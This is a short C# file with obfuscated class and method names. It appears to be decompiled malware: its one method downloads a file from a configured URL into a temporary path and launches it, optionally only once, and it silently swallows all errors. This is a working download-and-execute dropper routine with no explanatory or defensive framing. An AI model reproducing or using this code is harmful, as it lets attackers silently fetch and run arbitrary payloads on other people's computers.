using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using Microsoft.VisualBasic.CompilerServices;
using ns2;
using ns4;

namespace ns9;

public class GClass8
{
	public static void smethod_0()
	{
		WebClient webClient = new WebClient();
		string fileName = Path.GetTempFileName() + Path.GetFileName(GClass3.string_9);
		try
		{
			if (Operators.CompareString(GClass3.string_9, "", false) != 0)
			{
				if (GClass3.bool_4)
				{
					if (Operators.CompareString(Class0.smethod_3("DWN"), "True", false) != 0)
					{
						webClient.DownloadFile(GClass3.string_9, fileName);
						Process.Start(fileName);
						Class0.smethod_4("DWN", "True");
					}
				}
				else
				{
					webClient.DownloadFile(GClass3.string_9, fileName);
					Process.Start(fileName);
				}
			}
			try
			{
				webClient.Dispose();
				webClient = null;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}
}
